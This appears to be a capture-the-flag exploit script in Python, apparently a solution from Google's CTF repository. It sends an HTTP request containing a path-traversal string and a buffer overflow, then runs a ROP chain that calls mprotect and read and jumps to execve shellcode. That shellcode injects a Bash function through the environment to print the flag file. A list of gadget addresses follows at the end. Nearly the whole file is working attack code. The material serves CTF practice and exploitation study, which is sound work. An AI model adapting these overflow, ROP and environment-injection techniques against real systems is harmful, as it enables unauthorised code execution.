# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import struct
"""
0x00007fffffffe0d8: 0x00007fffffffe40c -> "GS_LIB=/home/a/.fonts"        <- $rdx


"""

def p64(addr):
  return struct.pack('Q', addr)

payload = b"POST /../../../../../bin/aaaaaaaaaa?aa aa"

rop = b""

SHELLCODE_ADDR = 0x00000000006b2000
SYSCALL1 = 0x0000000000481545
SYSCALL2 = 0x000000000045ec65

shellcode_execve = bytes.fromhex("b83b000000488d3c2519206b00be40206b00ba40206b000f052f686f6d652f757365722f7777772f6367692d62696e2f6c6f67696e2d746f2d73656d2e736800")

shellcode = shellcode_execve
env_table_addr = SHELLCODE_ADDR + len(shellcode)
env = p64(env_table_addr+16)+p64(0)
env += b"BASH_FUNC_echo%%=() { cat ../flag;}\x00"
shellcode += env
# print hex(env_table_addr)


#mprotect
rop += p64(0x000000000046e546) #: pop rax; pop rdx; pop rbx; ret;
rop += p64(210)
rop += p64(7)
rop += p64(0x0)
rop += p64(0x00000000004a38aa) #: xor al, 0xd8; ret;

rop += p64(0x0000000000400535) #: pop rdi; ret
rop += p64(SHELLCODE_ADDR)
rop += p64(0x0000000000401877) #: pop rsi; ret
rop += p64(0x1000)
rop += p64(SYSCALL1) #: syscall; ret;


#read (0, data, len)

rop += p64(0x000000000046e546) #: pop rax; pop rdx; pop rbx; ret;
rop += p64(0)
rop += b"b"*16

rop += p64(0x0000000000400535) #: pop rdi; ret
rop += p64(0)
rop += p64(0x0000000000401877) #: pop rsi; ret
rop += p64(SHELLCODE_ADDR)
rop += p64(0x0000000000435db5) #: pop rdx; ret
rop += p64(0x1000)
rop += p64(SYSCALL1) #: ret to read

#jmp
rop += p64(0x0000000000401877) #: pop rsi; ret
rop += p64(SHELLCODE_ADDR)
rop += p64(0x000000000048cf1f) #: jmp rsi;


payload += b"a"*(1078-len(payload))
payload += rop

"""

0x0000000000481540: mov eax, 0x27; syscall; ret;
0x0000000000461a50: mov eax, 0x66; syscall; ret;
0x0000000000461a70: mov eax, 0x68; syscall; ret;
0x0000000000461a60: mov eax, 0x6b; syscall; ret;
0x0000000000461a80: mov eax, 0x6c; syscall; ret;
0x000000000045ec60: mov eax, 0xc9; syscall; ret;
0x0000000000461a68: nop dword ptr [rax + rax]; mov eax, 0x68; syscall; ret;
0x0000000000461a58: nop dword ptr [rax + rax]; mov eax, 0x6b; syscall; ret;
0x0000000000461a78: nop dword ptr [rax + rax]; mov eax, 0x6c; syscall; ret;
0x000000000048153c: nop dword ptr [rax]; mov eax, 0x27; syscall; ret;
0x000000000045ec5d: nop dword ptr [rax]; mov eax, 0xc9; syscall; ret;
0x0000000000461a4f: nop; mov eax, 0x66; syscall; ret;
0x0000000000461a4e: nop; mov eax, 0x66; syscall; ret;
0x000000000045ec65: syscall; ret;
0x0000000000461a55: syscall; ret;
0x0000000000461a65: syscall; ret;
0x0000000000461a75: syscall; ret;
0x0000000000461a85: syscall; ret;
0x0000000000481545: syscall; ret;

0x0000000000400981: jmp rax;
0x000000000046cb12: jmp rbx;
0x00000000004226d4: jmp rcx;
0x00000000004a75d7: jmp rdi;
0x00000000004162fa: jmp rdx;
0x000000000048cf1f: jmp rsi;
0x000000000045c48d: jmp rsp;

0x0000000000410110: mov rax, rdx; ret;
0x00000000004074f2: mov rbp, rax; call qword ptr [rbp];
0x00000000004abb38: xchg rax, rcx; clc; jmp qword ptr [rdx];


0x000000000046e546: pop rax; pop rdx; pop rbx; ret;
0x0000000000400535: pop rdi; ret;
0x0000000000401877: pop rsi; ret;
0x0000000000435db5: pop rdx; ret;
0x000000000045ec65: syscall; ret;
0x0000000000461b95: mov rdx, rsp; syscall;
0x000000000046a86a: mov rsi, rsp; syscall;
0x0000000000433520: mov rdi, rdx; mov eax, esi; syscall;

"""
